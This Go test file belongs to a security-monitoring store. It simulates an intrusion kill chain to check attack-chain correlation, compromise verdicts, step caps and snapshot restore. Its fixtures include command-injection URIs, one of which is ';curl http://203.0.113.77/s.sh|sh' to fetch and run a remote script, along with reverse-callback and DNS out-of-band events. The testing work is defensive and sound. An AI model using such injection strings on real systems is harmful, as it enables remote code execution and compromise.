package store

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"netsa/internal/model"
)

func hit(rule, cat, phase string, sev model.Severity, result string) model.Hit {
	return model.Hit{RuleID: rule, Name: rule, Category: cat, Severity: sev, Phase: phase, Result: result, Evidence: rule + " 证据"}
}

// killChain 模拟一次完整的入侵：扫描 → 漏洞利用 → 成功 → 服务器回连载荷中的地址 → 内网横向 → 接口遍历。
// 站点 www.example.com 与服务器 10.0.0.10 之间没有登记资产台账，靠“回连地址出现在攻击载荷中”合并。
func killChain(s *Store, t0 time.Time) {
	const atk, c2, site, srv = "45.33.10.20", "203.0.113.77", "www.example.com", "10.0.0.10"
	web := func(dt time.Duration, uri string, status int, h model.Hit, payload ...string) {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: atk, Host: site, Method: "GET", URI: uri, Status: status, Bytes: 300,
			Time: t0.Add(dt), PayloadAddrs: payload}, []model.Hit{h})
	}
	for i := range 5 {
		web(time.Duration(i)*time.Second, fmt.Sprintf("/backup%d.zip", i), 404, hit("bhv-dirscan", "目录扫描", model.PhaseRecon, model.SevMedium, model.ResultFailed))
	}
	web(3*time.Minute, "/api/ping?host=;id", 404, hit("cmd-inject", "命令/代码执行", model.PhaseExploit, model.SevHigh, model.ResultFailed))
	web(5*time.Minute, "/api/ping?host=;curl+http://"+c2+"/s.sh|sh", 200,
		hit("cmd-inject", "命令/代码执行", model.PhaseExploit, model.SevHigh, model.ResultSuccess), c2)
	// 服务器外连载荷中的回连地址（命中威胁情报）
	s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: srv, DstIP: c2, DstPort: 443, Proto: "tcp", Action: model.ActionAllow, Outbound: true,
		Time: t0.Add(7 * time.Minute)}, []model.Hit{hit("c2-egress", CatC2, model.PhasePersistence, model.SevCritical, model.ResultAllowed)})
	// 横向：服务器扫描内网
	for i := range 3 {
		s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: srv, DstIP: "10.0.0.21", DstPort: 445 + i, Proto: "tcp", Action: model.ActionDeny,
			Time: t0.Add(20 * time.Minute)}, []model.Hit{hit("bhv-portscan", "端口扫描", model.PhaseRecon, model.SevHigh, model.ResultBlocked)})
	}
	// 窃取：攻击者遍历用户接口
	web(30*time.Minute, "/api/v1/user/100001/profile", 200, hit("bhv-crawl", CatCrawl, model.PhaseCollection, model.SevMedium, model.ResultPassed))
}

func TestAssetChainKillChain(t *testing.T) {
	s := newTestStore()
	t0 := time.Now().Add(-2 * time.Hour)
	killChain(s, t0)

	c := s.AssetChain("www.example.com")
	if c == nil {
		t.Fatal("应能按站点域名查到链路")
	}
	if !slices.Contains(c.Members, "www.example.com") || !slices.Contains(c.Members, "10.0.0.10") {
		t.Fatalf("站点与回连的服务器应合并为同一资产: %v", c.Members)
	}
	if slices.Contains(c.Members, "10.0.0.21") {
		t.Fatalf("被横向扫描的主机是另一个资产，不应合并: %v", c.Members)
	}
	want := []string{"recon", "exploit", "breach", "control", "lateral", "collect"}
	if !slices.Equal(c.Reached, want) {
		t.Fatalf("推进到的阶段 %v，应为 %v", c.Reached, want)
	}
	if c.Confidence != "high" || c.Depth != "collect" {
		t.Fatalf("外连载荷中的回连地址应研判为高置信失陷: %s %s %s", c.Confidence, c.Depth, c.Verdict)
	}
	if !strings.Contains(c.Verdict, "已失陷") {
		t.Fatalf("研判结论: %s", c.Verdict)
	}
	if len(c.Links) == 0 || !strings.Contains(c.Links[0].Reason, "攻击载荷") {
		t.Fatalf("应注明合并依据: %+v", c.Links)
	}
	// 关键路径：每个阶段一步，按阶段顺序；侦察、利用选的是后来突破成功的攻击者
	var path []string
	for _, p := range c.Path {
		path = append(path, p.Stage)
		if (p.Stage == "recon" || p.Stage == "exploit" || p.Stage == "breach") && p.Src != "45.33.10.20" {
			t.Fatalf("%s 阶段应选突破成功的攻击者: %+v", p.Stage, p)
		}
		if p.Stage == "control" && (!p.Self || p.Peer != "203.0.113.77" || len(p.Techniques) == 0) {
			t.Fatalf("控制阶段应是服务器自身外连回连地址，并标注 ATT&CK 技术: %+v", p)
		}
		if p.Stage == "lateral" && (p.Src != "10.0.0.10" || p.Peer != "10.0.0.21") {
			t.Fatalf("横向阶段: %+v", p)
		}
	}
	if !slices.Equal(path, want) {
		t.Fatalf("关键路径 %v", path)
	}
	// 时间线按时间排序
	for i := 1; i < len(c.Steps); i++ {
		if c.Steps[i].First.Before(c.Steps[i-1].First) {
			t.Fatalf("时间线未按时间排序: %v %v", c.Steps[i-1].First, c.Steps[i].First)
		}
	}
	if len(c.SourceList) != 1 || c.SourceList[0].IP != "45.33.10.20" {
		t.Fatalf("攻击来源只有攻击者（服务器自身不算来源）: %+v", c.SourceList)
	}
	adv := strings.Join(c.Advice, "\n")
	for _, w := range []string{"隔离", "203.0.113.77", "10.0.0.21", "45.33.10.20"} {
		if !strings.Contains(adv, w) {
			t.Fatalf("处置建议应包含 %s:\n%s", w, adv)
		}
	}
	// 按服务器地址也能查到同一条链路
	if c2 := s.AssetChain("10.0.0.10"); c2 == nil || c2.Key != c.Key {
		t.Fatalf("按服务器地址应查到同一资产: %+v", c2)
	}
	// 列表：失陷资产排在最前；被横向扫描的主机单独列出，来源为内网主机
	l := s.ChainList(ChainQuery{})
	if l.Total != 2 || l.Chains[0].Key != c.Key || l.Compromised["high"] != 1 {
		t.Fatalf("列表: total=%d %+v %v", l.Total, l.Chains, l.Compromised)
	}
	t21 := s.AssetChain("10.0.0.21")
	if t21 == nil || t21.Depth != "recon" || len(t21.Steps) == 0 || !t21.Steps[0].Internal {
		t.Fatalf("被横向扫描的主机: %+v", t21)
	}
	if l := s.ChainList(ChainQuery{Stage: "exploit"}); l.Total != 1 {
		t.Fatalf("越过侦察阶段的只有 1 个: %d", l.Total)
	}
	if l := s.ChainList(ChainQuery{Search: "10.0.0.10"}); l.Total != 1 {
		t.Fatalf("按服务器地址搜索: %d", l.Total)
	}
}

// 资产台账：精确登记的资产按名称合并；按网段登记的仍按主机区分，并注明所属资产。
func TestAssetChainRegistry(t *testing.T) {
	s := newTestStore()
	s.AssetOf = func(ip, host string) *model.AssetRef {
		switch {
		case ip == "10.0.0.10" || host == "www.example.com":
			return &model.AssetRef{Name: "官网", Level: "core", Owner: "张三"}
		case strings.HasPrefix(ip, "10.0.1."):
			return &model.AssetRef{Name: "办公网", Level: "normal", Group: true}
		}
		return nil
	}
	now := time.Now()
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "45.33.10.20", Host: "WWW.Example.com:443", URI: "/x", Status: 404, Time: now},
		[]model.Hit{hit("sqli", "SQL注入", model.PhaseExploit, model.SevHigh, model.ResultFailed)})
	s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.10", DstIP: "198.51.100.66", DstPort: 4444, Proto: "tcp", Action: model.ActionAllow, Time: now},
		[]model.Hit{hit("corr-callback", CatCallback, model.PhasePersistence, model.SevHigh, model.ResultAllowed)})
	for _, ip := range []string{"10.0.1.5", "10.0.1.6"} {
		s.Record(&model.Event{Kind: model.KindDNS, SrcIP: ip, Host: "abc.x7k2p9.dnslog.cn", Time: now},
			[]model.Hit{hit("dns-oob", "带外探测回连", model.PhasePersistence, model.SevHigh, model.ResultUnknown)})
	}
	l := s.ChainList(ChainQuery{})
	if l.Tracked != 3 || l.Total != 3 {
		t.Fatalf("官网 1 个 + 办公网两台主机各 1 个: tracked=%d total=%d %+v", l.Tracked, l.Total, l.Chains)
	}
	c := s.AssetChain("www.example.com")
	if c == nil || c.Key != "官网" || c.Kind != "asset" || c.Level != "core" || c.Owner != "张三" {
		t.Fatalf("站点应归入台账资产: %+v", c)
	}
	if !slices.Equal(c.Reached, []string{"exploit", "control"}) || c.Confidence != "high" {
		t.Fatalf("官网: %v %s", c.Reached, c.Confidence)
	}
	h := s.AssetChain("10.0.1.5")
	if h == nil || h.Key != "10.0.1.5" || h.Asset != "办公网" || h.Depth != "control" {
		t.Fatalf("按网段登记的主机仍单独成链，并注明所属资产: %+v", h)
	}
	if h.Steps[0].Peer != "dnslog.cn" {
		t.Fatalf("DNS 外连的对端记为主域名: %+v", h.Steps[0])
	}
}

// 分析员把来源的事件标为误报后，该来源的步骤不计入阶段与失陷研判。
func TestAssetChainDismissed(t *testing.T) {
	s := newTestStore()
	now := time.Now()
	res := s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "45.33.10.20", Host: "a.example.com", URI: "/x", Status: 200, Time: now},
		[]model.Hit{hit("cmd-inject", "命令/代码执行", model.PhaseExploit, model.SevHigh, model.ResultSuccess)})
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "45.33.10.21", Host: "a.example.com", URI: "/.env", Status: 404, Time: now},
		[]model.Hit{hit("sens", "敏感文件探测", model.PhaseRecon, model.SevLow, model.ResultFailed)})
	if c := s.AssetChain("a.example.com"); c.Confidence != "medium" || !slices.Contains(c.Reached, "breach") {
		t.Fatalf("只凭 2xx 的成功为中置信: %s %v", c.Confidence, c.Reached)
	}
	if _, err := s.UpdateIncidents([]uint64{res.Alerts[0].IncidentID}, "alice", IncidentUpdate{Status: IncFalsePositive, Note: "接口本身返回 200"}); err != nil {
		t.Fatal(err)
	}
	c := s.AssetChain("a.example.com")
	if c.Confidence != "" || !slices.Equal(c.Reached, []string{"recon"}) {
		t.Fatalf("误报来源的步骤不计入: %s %v", c.Confidence, c.Reached)
	}
	dismissed := 0
	for _, v := range c.Steps {
		if v.Dismissed {
			dismissed++
		}
	}
	if dismissed != 1 || len(c.Path) != 1 {
		t.Fatalf("误报的步骤仍在时间线中显示并注明，但不进入关键路径: %d %+v", dismissed, c.Path)
	}
}

// 互联网背景扫描：大量来源只保留前若干个侦察步骤，阶段累计不丢；步骤满时为更深的阶段让位。
func TestAssetChainCaps(t *testing.T) {
	s := New(100000, 1000, 5, time.Hour)
	now := time.Now()
	for i := range 200 {
		s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: fmt.Sprintf("45.%d.%d.9", i/250+1, i%250), DstIP: "43.242.97.44", DstPort: 22, Proto: "tcp",
			Action: model.ActionDeny, Time: now}, []model.Hit{hit("fw-riskport", "高危服务探测", model.PhaseRecon, model.SevLow, model.ResultBlocked)})
	}
	tr := s.chains[chainKey{"host", "43.242.97.44"}]
	if tr == nil || len(tr.Steps) != chainMaxRecon || tr.Stages[stRecon].Hits != 200 || tr.Dropped != 200-chainMaxRecon {
		t.Fatalf("侦察步骤上限: steps=%d hits=%d dropped=%d", len(tr.Steps), tr.Stages[stRecon].Hits, tr.Dropped)
	}
	for i := range chainMaxSteps + 10 {
		s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: fmt.Sprintf("46.%d.%d.9", i/250+1, i%250), DstIP: "43.242.97.44", DstPort: 6379, Proto: "tcp",
			Action: model.ActionAllow, Time: now}, []model.Hit{hit("redis-exp", "已知漏洞利用", model.PhaseExploit, model.SevHigh, model.ResultAllowed)})
	}
	recon := 0
	for _, st := range tr.Steps {
		if st.Stage == stRecon {
			recon++
		}
	}
	if len(tr.Steps) != chainMaxSteps || recon != 0 || tr.recon != 0 || len(tr.idx) != len(tr.Steps) {
		t.Fatalf("步骤满时淘汰侦察步骤: steps=%d recon=%d/%d idx=%d", len(tr.Steps), recon, tr.recon, len(tr.idx))
	}
	c := s.AssetChain("43.242.97.44")
	if !slices.Equal(c.Reached, []string{"recon", "exploit"}) || c.Stages[stRecon].Hits != 200 {
		t.Fatalf("侦察步骤被淘汰后阶段仍以累计为准: %v %d", c.Reached, c.Stages[stRecon].Hits)
	}
	if len(c.Steps) > chainViewSteps || c.StepsTotal != chainMaxSteps {
		t.Fatalf("详情步骤: %d / %d", len(c.Steps), c.StepsTotal)
	}
}

// 资产标识数达到上限时先淘汰只有侦察的。
func TestAssetChainEvict(t *testing.T) {
	s := New(100000, 1000, 5, time.Hour)
	now := time.Now()
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "45.33.10.20", Host: "keep.example.com", URI: "/x", Status: 200, Time: now.Add(-time.Hour)},
		[]model.Hit{hit("cmd-inject", "命令/代码执行", model.PhaseExploit, model.SevHigh, model.ResultSuccess)})
	for i := range chainMaxTracks + 5 {
		s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: "45.33.10.21", DstIP: fmt.Sprintf("43.%d.%d.1", i/250, i%250), DstPort: 22, Proto: "tcp",
			Action: model.ActionDeny, Time: now}, []model.Hit{hit("fw-riskport", "高危服务探测", model.PhaseRecon, model.SevLow, model.ResultBlocked)})
	}
	if len(s.chains) > chainMaxTracks {
		t.Fatalf("资产标识数超过上限: %d", len(s.chains))
	}
	if s.chains[chainKey{"site", "keep.example.com"}] == nil {
		t.Fatal("推进到突破阶段的资产不应被淘汰")
	}
}

// 同一来源攻击过很多站点时，回连它的服务器只合并到回连之前最近被它攻击的站点。
func TestAssetChainAmbiguousCallback(t *testing.T) {
	s := newTestStore()
	t0 := time.Now().Add(-3 * time.Hour)
	for i := range 5 {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "45.33.10.20", Host: fmt.Sprintf("s%d.example.com", i), URI: "/x?a=1'", Status: 500,
			Time: t0.Add(time.Duration(i) * time.Minute)}, []model.Hit{hit("sqli", "SQL注入", model.PhaseExploit, model.SevHigh, model.ResultError)})
	}
	s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.50", DstIP: "45.33.10.20", DstPort: 4444, Proto: "tcp", Action: model.ActionAllow,
		Time: t0.Add(10 * time.Minute)}, []model.Hit{hit("corr-callback", CatCallback, model.PhasePersistence, model.SevHigh, model.ResultAllowed)})
	c := s.AssetChain("10.0.0.50")
	if c == nil || len(c.Members) != 2 || !slices.Contains(c.Members, "s4.example.com") {
		t.Fatalf("应只合并最近被攻击的站点: %+v", c)
	}
	// 回连发生在攻击之后很久：不合并
	s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.51", DstIP: "45.33.10.20", DstPort: 4444, Proto: "tcp", Action: model.ActionAllow,
		Time: t0.Add(5 * time.Hour)}, []model.Hit{hit("corr-callback", CatCallback, model.PhasePersistence, model.SevHigh, model.ResultAllowed)})
	if c := s.AssetChain("10.0.0.51"); len(c.Members) != 1 {
		t.Fatalf("超出关联窗口的回连不合并: %v", c.Members)
	}
}

// 不属于攻击链路的命中：访问钓鱼网站、连接“攻击来源”类情报只说明有人访问过。
func TestAssetChainIgnoresWeakEgress(t *testing.T) {
	s := newTestStore()
	now := time.Now()
	s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.31", DstIP: "198.51.100.8", DstPort: 443, Proto: "tcp", Action: model.ActionAllow, Outbound: true, Time: now},
		[]model.Hit{hit("c2-egress", CatPhishing, model.PhasePersistence, model.SevMedium, model.ResultAllowed)})
	s.Record(&model.Event{Kind: model.KindDNS, SrcIP: "10.0.0.31", Host: "login.phish.example", Time: now},
		[]model.Hit{hit("intel-dns", CatPhishing, model.PhasePersistence, model.SevMedium, model.ResultUnknown)})
	if l := s.ChainList(ChainQuery{}); l.Tracked != 0 {
		t.Fatalf("不应记入链路: %+v", l.Chains)
	}
}

// 快照保存与恢复后链路不丢，新的命中继续累计到原来的步骤上。
func TestAssetChainSnapshot(t *testing.T) {
	s := newTestStore()
	t0 := time.Now().Add(-2 * time.Hour)
	killChain(s, t0)
	path := filepath.Join(t.TempDir(), "state.json.gz")
	if err := s.Save(path); err != nil {
		t.Fatal(err)
	}
	r := newTestStore()
	if err := r.Load(path); err != nil {
		t.Fatal(err)
	}
	a, b := s.AssetChain("www.example.com"), r.AssetChain("www.example.com")
	if b == nil || !slices.Equal(a.Reached, b.Reached) || len(a.Steps) != len(b.Steps) || a.Confidence != b.Confidence {
		t.Fatalf("快照恢复后链路应一致:\n%+v\n%+v", a.ChainSummary, b)
	}
	tr := r.chains[chainKey{"site", "www.example.com"}]
	before := len(tr.Steps)
	r.Record(&model.Event{Kind: model.KindWeb, SrcIP: "45.33.10.20", Host: "www.example.com", URI: "/backup9.zip", Status: 404, Time: t0.Add(time.Hour)},
		[]model.Hit{hit("bhv-dirscan", "目录扫描", model.PhaseRecon, model.SevMedium, model.ResultFailed)})
	if len(tr.Steps) != before {
		t.Fatalf("恢复后的重复命中应累计到原步骤: %d → %d", before, len(tr.Steps))
	}
	if fi, err := os.Stat(path); err != nil || fi.Size() == 0 {
		t.Fatal("快照文件为空")
	}
}

// 疑似失陷资产带上链路标识，页面可直接展开链路。
func TestCompromisedChainKey(t *testing.T) {
	s := newTestStore()
	killChain(s, time.Now().Add(-time.Hour))
	found := false
	for _, c := range s.CompromisedAssets() {
		if c.Chain == "" {
			t.Fatalf("疑似失陷资产缺少链路标识: %+v", c)
		}
		if ch := s.AssetChain(c.Chain); ch == nil {
			t.Fatalf("按疑似失陷资产的标识查不到链路: %s", c.Chain)
		} else if slices.Contains(ch.Members, "10.0.0.10") {
			found = true
		}
	}
	if !found {
		t.Fatal("失陷的服务器应能展开到合并后的链路")
	}
}

func BenchmarkChainRecord(b *testing.B) {
	s := New(100000, 1000, 5, time.Hour)
	now := time.Now()
	evs := make([]*model.Event, 1000)
	for i := range evs {
		evs[i] = &model.Event{Kind: model.KindWeb, SrcIP: fmt.Sprintf("45.33.%d.%d", i/250, i%250), Host: fmt.Sprintf("s%d.example.com", i%50),
			URI: "/x", Status: 404, Time: now}
	}
	h := []model.Hit{hit("sqli", "SQL注入", model.PhaseExploit, model.SevHigh, model.ResultFailed)}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		s.Record(evs[i%len(evs)], h)
	}
}

func BenchmarkChainList(b *testing.B) {
	s := New(100000, 1000, 5, time.Hour)
	now := time.Now()
	for i := range chainMaxTracks {
		for k := range 10 {
			s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: fmt.Sprintf("45.33.%d.%d", k, i%250), DstIP: fmt.Sprintf("43.%d.%d.1", i/250, i%250),
				DstPort: 22, Proto: "tcp", Action: model.ActionDeny, Time: now},
				[]model.Hit{hit("fw-riskport", "高危服务探测", model.PhaseRecon, model.SevLow, model.ResultBlocked)})
		}
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		s.ChainList(ChainQuery{})
	}
}

// 每个攻击类型映射的 ATT&CK 技术都要登记：未登记的技术在矩阵的位掩码中会落到第 0 位，把命中算到不相关的技术上
// （曾经“破坏性攻击”被记成了“远程系统发现”）。技术数不能超过位掩码的 64 位。
func TestAttackTechniquesRegistered(t *testing.T) {
	if len(techniques) > 64 {
		t.Fatalf("技术数 %d 超过位掩码的 64 位", len(techniques))
	}
	for cat, ids := range categoryTechniques {
		for _, id := range ids {
			if _, ok := techniques[id]; !ok {
				t.Errorf("%s 映射的 %s 没有登记", cat, id)
			}
		}
	}
	s := newTestStore()
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "45.33.10.20", Host: "a.example.com", URI: "/x", Status: 200, Time: time.Now()},
		[]model.Hit{hit("destroy", "破坏性攻击", model.PhaseImpact, model.SevHigh, model.ResultPassed)})
	for _, tc := range s.AttackMatrix().Tactics {
		for _, x := range tc.Techniques {
			if x.ID == "T1018" && x.Attackers > 0 {
				t.Fatalf("破坏性攻击不应计入远程系统发现: %+v", x)
			}
			if x.ID == "T1485" && x.Attackers != 1 {
				t.Fatalf("破坏性攻击应计入数据销毁: %+v", x)
			}
		}
	}
}

// 快照中的资产攻击链路格式不对时只丢弃链路，事件与画像照常恢复。
func TestSnapshotTolerantChains(t *testing.T) {
	var snap snapshot
	data := `{"version":2,"incidents":{"1":{"id":1,"key":"203.0.113.1","status":"open"}},"asset_chains":{"bad":"format"},"profiles":{}}`
	if err := json.Unmarshal([]byte(data), &snap); err != nil {
		t.Fatalf("链路格式不对不应导致整个快照无法解析: %v", err)
	}
	if len(snap.Incidents) != 1 || len(snap.Chains) != 0 {
		t.Fatalf("%+v", snap)
	}
}
